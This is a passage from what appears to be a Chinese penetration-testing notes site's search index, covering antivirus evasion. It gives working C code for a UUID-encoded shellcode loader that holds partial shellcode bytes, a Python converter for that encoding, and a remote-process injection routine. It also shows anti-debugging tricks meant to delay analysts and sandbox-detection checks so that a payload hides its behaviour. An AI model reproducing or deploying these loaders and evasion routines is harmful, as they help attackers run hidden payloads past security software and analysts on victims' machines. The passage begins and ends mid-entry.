\u52a0\u8f7d\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_5","text":"ssi\u6e90\u7801\u5f88\u7b80\u5355\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003\u5199\u4e00\u4e0b","title":"\u81ea\u5199\u52a0\u8f7d\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_7","text":"\u5927\u601d\u8def\u5c31\u662f\u628ashellcode\u6df7\u6dc6\u540e\uff0c\u653e\u5165\u52a0\u8f7d\u5668\u52a0\u8f7d\u8fd0\u884c\u3002 \u5176\u7ec6\u5206\u601d\u8def\u5c31\u5305\u62ec\u600e\u4e48\u628ashellcode\u8fdb\u884c\u6df7\u6dc6\u4e86\uff0c\u7b80\u5355\u7684\u6709XOR,BASE64\uff0c\u590d\u6742\u4e00\u70b9\u7684\u6709AES\u7b49\u3002 \u8fd9\u91cc\u5c31\u53ea\u8bf4\u8bf4xor\u3002 \u9996\u5148\u6211\u4eec\u5f97\u51c6\u5907\u4e00\u4e2a\u7a0b\u5e8f\u5c06shellcode\u8fdb\u884c\u6df7\u6dc6\u3002\u56fe\u65b9\u4fbf\u5c31\u62ffpython\u5199\u4e5f\u662f\u86ee\u4e0d\u9519\u7684\u3002 \u968f\u4fbf\u5199\u4e86\u4e00\u4e2a\u3002\u6548\u679c\u771f\u4e0d\u6233\uff08\u867d\u7136\u4e0a\u4f20\u4e86vt\u8fc7\u4e24\u5929\u5c31\u80af\u5b9a\u4e0d\u80fd\u7528\u4e86) github: https://github.com/ConsT27/SimpleXORshellcode","title":"shellcode\u53d8\u5f62"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#uuid","text":"\u53ef\u4ee5\u628ashellcode\u53d8\u5f62\u4e3aUUID\uff0c\u8981\u7528\u7684\u65f6\u5019\u518d\u53d8\u56de\u6765\u3002 \u76f8\u5173API\u6709 RPC_STATUS UuidFromString( RPC_CSTR StringUuid, UUID *Uuid ); \u529f\u80fd\uff1a\u5c06\u5b57\u7b26\u4e32UUID\u8f6c\u6362\u4e3aUUID\u7ed3\u6784\u3002 RPC_STATUS UuidCreate( UUID *Uuid ); \u529f\u80fd\uff1a\u521b\u5efaUUID\u7ed3\u6784\u3002 int UuidEqual( UUID *Uuid1, UUID *Uuid2, RPC_STATUS *Status ); \u529f\u80fd\uff1a\u5224\u65ad\u4e24\u4e2aUUID\u662f\u5426\u76f8\u7b49\u3002 \u8fd9\u91cc\u501f\u7528\u503e\u7487\u7684UUID\u751f\u6210\u811a\u672c\u6765\u751f\u4ea7shellcode\u5bf9\u5e94\u7684UUID from uuid import UUID import os import sys # Usage: python3 binToUUIDs.py shellcode.bin [--print] print(\"\"\" ____ _ _______ _ _ _ _ _____ _____ | _ \\(_) |__ __| | | | | | | |_ _| __ \\ | |_) |_ _ __ | | ___ | | | | | | | | | | | | |___ | _ <| | '_ \\| |/ _ \\| | | | | | | | | | | | / __| | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \\__ \\ |____/|_|_| |_|_|\\___/ \\____/ \\____/|_____|_____/|___/ \\n\"\"\") with open(sys.argv[1], \"rb\") as f: bin = f.read() if len(sys.argv) > 2 and sys.argv[2] == \"--print\": outputMapping = True else: outputMapping = False offset = 0 print(\"Length of shellcode: {} bytes\\n\".format(len(bin))) out = \"\" while(offset < len(bin)): countOfBytesToConvert = len(bin[offset:]) if countOfBytesToConvert < 16: ZerosToAdd = 16 - countOfBytesToConvert byteString = bin[offset:] + (b'\\x00'* ZerosToAdd) uuid = UUID(bytes_le=byteString) else: byteString = bin[offset:offset+16] uuid = UUID(bytes_le=byteString) offset+=16 out += \"\\\"{}\\\",\\n\".format(uuid) if outputMapping: print(\"{} -> {}\".format(byteString, uuid)) with open(sys.argv[1] + \"UUIDs\", \"w\") as f: f.write(out) print(\"Outputted to: {}\".format(sys.argv[1] + \"UUIDs\")) \u7136\u540e\u5b9e\u9645\u52a0\u8f7d\u5668\u6587\u4ef6\u4e3a #pragma comment(lib,\"Rpcrt4.lib\") int main(int argc, char* argv[]) { const char * buf[] = { \"0089e8fc-0000-8960-e531-d2648b52308b\", \"528b0c52-8b14-2872-0fb7-4a2631ff31c0\", \"7c613cac-2c02-c120-cf0d-01c7e2f05257\", \"8b10528b-3c42-d001-8b40-7885c0744a01\", }; const int num = sizeof(buf) / sizeof(buf[0]); HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0); if (hMemory == NULL) { return -1; } PVOID pMemory = HeapAlloc(hMemory, 0, 2048); DWORD_PTR CodePtr = (DWORD_PTR)pMemory; for (int i = 0; i < num; i++) { RPC_STATUS status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr); CodePtr += 16; } DWORD dwThreadId = 0; HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pMemory, NULL, NULL, &dwThreadId); WaitForSingleObject(hThread, INFINITE); }","title":"UUID\u53d8\u5f62"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#shellcode_8","text":"","title":"shellcode\u6ce8\u5165\u8fdb\u7a0b\u5185\u5b58"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_6","text":"\u5927\u81f4\u903b\u8f91:OpenProcess\u83b7\u5f97\u8fdb\u7a0b\u53e5\u67c4->VirtualAllocEx\u5728\u8fdb\u7a0b\u4e2d\u5f00\u8f9f\u4e00\u6bb5\u5185\u5b58\u7a7a\u95f4->WriteProcessMemory\u5411\u521a\u521a\u5f00\u8f9f\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u5199\u5165shellcode->CreateRemoteThread\u4e3a\u521a\u521a\u5199\u5165\u7684shellcode\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c #include <iostream> #include<Windows.h> int main() { unsigned char buf[] = \"shellcode\"; DWORD pid = 25388; HANDLE Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!Proc) { std::cout << GetLastError() << std::endl; } LPVOID buffer = VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); if (buffer) { std::cout << GetLastError() << std::endl; } if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) ){ std::cout << GetLastError() << std::endl; } HANDLE remotethread = CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0); } \u6548\u679c:\u867d\u7136\u4e5f\u5f88\u62c9\uff0c\u4f46\u662f\u9759\u6001\u8fc7\u4e86\u8d8b\u52bf\u662f\u6211\u6ca1\u60f3\u5230\u7684\u3002","title":"\u6ce8\u5165\u5df2\u6709\u8fdb\u7a0b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_7","text":"\u53ef\u4ee5\u901a\u8fc7\u53cd\u8c03\u8bd5\u6765\u89c4\u907f\u6740\u8f6f\u68c0\u6d4b\uff0c\u62d6\u6162\u9006\u5411\u5de5\u7a0b\u5e08\u5206\u6790\u901f\u5ea6\uff0c\u4f46\u4e5f\u6709\u53ef\u80fd\u63d0\u9ad8\u88ab\u5224\u4e3a\u6076\u610f\u6587\u4ef6\u7684\u6982\u7387\u3002","title":"\u53cd\u8c03\u8bd5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_8","text":"if (IsDebuggerPresent()) return FALSE; PPEB pPEB = (PPEB)__readgsqword(0x60); if (pPEB->BeingDebugged) return; BOOL ret; CheckRemoteDebuggerPresent(GetCurrentProcess(), &ret); return ret; NtQueryInformationProcess \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u83b7\u53d6\u67d0\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002 \u9700\u8981\u52a8\u6001\u94fe\u63a5\u5e93 #pragma comment(lib,\"ntdll\") \u5f53\u7136\u4e5f\u53ef\u4ee5\u7528GetProcAddress\u52a8\u6001\u83b7\u53d6\u8fd9\u4e2a\u51fd\u6570\u3002 \u8fd9\u4e2a\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u8fdb\u7a0b\u53e5\u67c4\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u7ed3\u6784\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u83b7\u53d6\u8fd4\u56de\u503c\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u662f\u8fd4\u56de\u503c\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u7b2c\u4e94\u4e2a\u586bNULL \u5176\u4e2d\u4e0e\u53cd\u8c03\u8bd5\u6709\u5173\u7684\u6210\u5458\u6709ProcessDebugPort(0x7)\u3001ProcessDebugObjectHandle(0x1E)\u548cProcessDebugFlags(0x1F) ProcessDebugPort\u53c2\u6570\uff0c\u82e5\u6ca1\u5728\u8c03\u8bd5\u4e2d\uff0c\u5219\u8be5\u51fd\u6570\u8fd4\u56de0\uff0c\u82e5\u5728\u8c03\u8bd5\u4e2d\u5219\u8fd4\u56de\u5bf9\u5e94\u7684\u8c03\u8bd5\u7aef\u53e3 \u5176\u4ed6\u53c2\u6570\u4e5f\u7c7b\u4f3c \u770b\u96ea\u4e0ahoujingyi\u5e08\u5085\u7684\u6f14\u793a\u4ee3\u7801 BOOL CheckDebug() { int debugPort = 0; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 0x7, &debugPort, sizeof(debugPort), NULL); return debugPort != 0; } BOOL CheckDebug() { HANDLE hdebugObject = NULL; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &hdebugObject, sizeof(hdebugObject), NULL); return hdebugObject != NULL; } BOOL CheckDebug() { BOOL bdebugFlag = TRUE; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &bdebugFlag, sizeof(bdebugFlag), NULL); return bdebugFlag != TRUE; }","title":"\u76f4\u63a5\u5224\u65ad\u662f\u5426\u4e3a\u8c03\u8bd5\u72b6\u6001"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_9","text":"\u5f53\u6211\u4eec\u5728\u8c03\u8bd5\u5668\u4e2d\u5bf9\u4e00\u884c\u4ee3\u7801\u6253\u4e0a\u65ad\u70b9\u65f6\uff0c\u5b9e\u8d28\u4e0a\u662f\u5c06\u8fd9\u884c\u4ee3\u7801\u6539\u4e3a\u4e860xcc\uff0c\u5373INT 3\uff0c\u4e2d\u65ad\u5f02\u5e38\uff0c\u6240\u4ee5\u8c03\u8bd5\u5668\u8fd0\u884c\u5230\u6b64\u5904\u65f6\u4f1a\u505c\u6b62\u3002 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u68c0\u6d4b\u4ee3\u7801\u4e2d\u662f\u5426\u67090xcc\u6765\u5224\u65ad\u662f\u5426\u88ab\u6253\u4e0a\u4e86\u8f6f\u4ef6\u65ad\u70b9\uff0c\u4ece\u800c\u8d77\u5230\u53cd\u8c03\u8bd5\u7684\u4f5c\u7528\u3002 \u8981\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u4f7f\u7528\u6c47\u7f16\u4ee3\u7801\u4e2d\u7684 repne scasb \u6307\u4ee4\uff0c\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u7f13\u51b2\u533a\u7684\u8d77\u59cb\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5339\u914d\u7684\u5b57\u7b26\u4e32\u3002\u5b83\u4f1a\u5728\u6307\u5b9a\u7684\u7f13\u51b2\u533a\u5185\u5bfb\u627e\u5b57\u7b26\u4e32\uff0c\u82e5\u6ca1\u6709\u627e\u5230\u5219\u8fd4\u56de.","title":"\u68c0\u6d4b\u8f6f\u4ef6\u65ad\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_10","text":"int t1 = GetTickCount64(); Hack(); //\u4e00\u4e2a\u51fd\u6570\uff0c\u8bf1\u5bfc\u5206\u6790\u4eba\u5458\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u8ddf\u8fdb\u8fdb\u53bb\u803d\u8bef\u65f6\u95f4 int t2 = GetTickCount64(); if (((t2 - t1) / 1000) > 5) { return FALSE; } //t1,t2\u68c0\u6d4b\u65f6\u95f4\u8fc7\u5927\u5219\u4f1a\u662f\u8c03\u8bd5 wprintf_s(L\"Now hacking more...\\n\"); \u4e5f\u53ef\u4ee5\u7528\u5185\u8054\u6c47\u7f16\u5b8c\u6210 BOOL CheckDebug() { DWORD time1, time2; __asm { rdtsc mov time1, eax ........\u5783\u573e\u4ee3\u7801\uff0c\u803d\u8bef\u5206\u6790\u4eba\u5458\u65f6\u95f4 rdtsc mov time2, eax } if (time2 - time1 < 0xff) { return FALSE; } else { return TRUE; } }","title":"\u65f6\u95f4\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_11","text":"\u89c1\u6c99\u7bb1\u7ed5\u8fc7\u7ae0\u8282\u4e2d\u7684\u201c\u68c0\u6d4b\u7236\u8fdb\u7a0b\u201d","title":"\u68c0\u6d4b\u7236\u8fdb\u7a0b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#seh","text":"\u4e0d\u662f\u5f88\u61c2 void AD_BreakPoint() { printf(\"SEH : BreakPoint\\n\"); __asm { // install SEH push handler push DWORD ptr fs:[0] mov DWORD ptr fs:[0], esp // generating exception int 3 // 1) debugging // go to terminating code mov eax, 0xFFFFFFFF jmp eax // process terminating!!! // 2) not debugging // go to normal code handler: mov eax, dword ptr ss:[esp+0xc] mov ebx, normal_code mov dword ptr ds:[eax+0xb8], ebx xor eax, eax retn normal_code: // remove SEH pop dword ptr fs:[0] add esp, 4 } printf(\" => Not debugging...\\n\\n\"); } int _tmain(int argc, TCHAR* argv[]) { AD_BreakPoint(); return 0; }","title":"SEH\u4e2d\u65ad"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#sandbox-evasion","text":"","title":"\u6c99\u7bb1\u7ed5\u8fc7\uff08Sandbox Evasion\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#system-checks","text":"\u68c0\u6d4b\u5f53\u524d\u73af\u5883\u662f\u5426\u662f\u6c99\u7bb1\u73af\u5883\uff0c\u5982\u679c\u662f\u6c99\u7bb1\u5219\u4e0d\u8868\u73b0\u51fa\u6076\u610f\u884c\u4e3a\u3002","title":"System Checks"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#hook","text":"\u6709\u4e9b\u6c99\u7bb1\u4f1a\u5bf9\u4e00\u4e9b\u51fd\u6570\u8fdb\u884cHOOK\u66f4\u6539\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u539fDLL\u4e2d\u67e5\u627e\u539f\u51fd\u6570\u4e0e\u8fdb\u7a0b\u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u6bd4\u5bf9\u4ece\u800c\u5224\u65ad\u5176\u662f\u5426\u88abHOOK. \u8fd9\u91cc\u662f\u522b\u4eba\u7684\u4ee3\u7801(RedTeaming) // manually load the dll HANDLE dllFile = CreateFileW(L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); DWORD dllFileSize = GetFileSize(dllFile, NULL); HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL); HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0); CloseHandle(dllFile); // analyze the dll PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew); PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader); PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions); PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames); PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals); // find the original function code PVOID pNtCreateThreadExOriginal = NULL; for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) { PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]); if (!strcmp(pFunctionName, \"NtCreateThreadEx\")) { pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]); break; } } // compare functions PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L\"ntdll.dll\"), \"NtCreateThreadEx\"); if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;","title":"\u68c0\u6d4b\u51fd\u6570\u662f\u5426\u88abHOOK\u66f4\u6539"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#gettickcount","text":"GetTickCount \u662fwin32 API\u4e4b\u4e00\uff0c\u7528\u6765\u8bb0\u5f55\u7535\u8111\u5f00\u673a\u540e\u7684\u8fd0\u884c\u65f6\u95f4\uff08\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff09 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u68c0\u6d4b\u5f53\u524d\u73af\u5883\u7684\u8fd0\u884c\u65f6\u95f4\uff0c\u5982\u679c\u65f6\u95f4\u5f88\u77ed\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u662f\u6c99\u7bb1\u3002 \u4e3a\u4ec0\u4e48\u65f6\u95f4\u5f88\u77ed\u5c31\u53ef\u80fd\u662f\u6c99\u7bb1\u73af\u5883\u5462\uff1f\u6c99\u7bb1\u5bf9\u6076\u610f\u7a0b\u5e8f\u7684\u68c0\u6d4b\u6d41\u7a0b\u5927\u81f4\u5982\u4e0b 1.\u542f\u52a8\u865a\u62df\u73af\u5883 2.\u5c06\u6076\u610f\u7a0b\u5e8f\u590d\u5236\u8fdb\u865a\u62df\u73af\u5883 3.\u8fd0\u884c\u6076\u610f\u7a0b\u5e8f\u4e00\u6bb5\u65f6\u95f4\uff08\u4e00\u822c\u4e3a5\u5206\u949f\uff09 4.\u83b7\u53d6\u865a\u62df\u73af\u5883\u8fd4\u56de\u7684\u62a5\u544a 5.\u5173\u673a \u5168\u7a0b\u4e0d\u8fc76.7\u5206\u949f\uff0c\u800c\u6b63\u5e38\u7684\u673a\u5668\u8fd0\u884c\u65f6\u95f4\u80af\u5b9a\u662f\u5927\u4e8e\u8fd9\u4e2a\u503c\u7684\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9a\u4e00\u4e2a\u6807\u51c6\uff1a\u5982\u679cGetTickCount\u8fd4\u56de\u7684\u503c\u5c0f\u4e8e10min\uff0c\u90a3\u4e48\u5c31\u88ab\u5224\u4e3a\u6c99\u7bb1\u73af\u5883\u3002","title":"GetTickCount"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#cpuram","text":"\u6c99\u7bb1\u7684CPUI\u591a\u4e3a1\u6838\uff0cram\u591a\u5c0f\u4e8e2g\uff0c\u786c\u76d8\u5927\u5c0f\u591a\u5c0f\u4e8e100g\u3002\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u4e00\u4e2a\u57fa\u51c6\u8fdb\u884c\u6c99\u7bb1\u68c0\u6d4b\u3002 //cpu processors SYSTEM_INFO systeminfo; GetSystemInfo(&systeminfo); DWORD numberOfProcessors = systeminfo.dwNumberOfProcessors; //ram MEMORYSTATUSEX memoryStatus; memoryStatus.dwLength = sizeof(memoryStatus); GlobalMemoryStatusEx(&memoryStatus); DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024; //hdd(\u786c\u76d8\u5927\u5c0f) HANDLE hDevice = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); DISK_GEOMETRY pDiskGeometry; DWORD bytesReturned; DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL); DWORD diskSizeGB; diskSizeGB = pDiskGeometry.Cylinders.QuadPart * 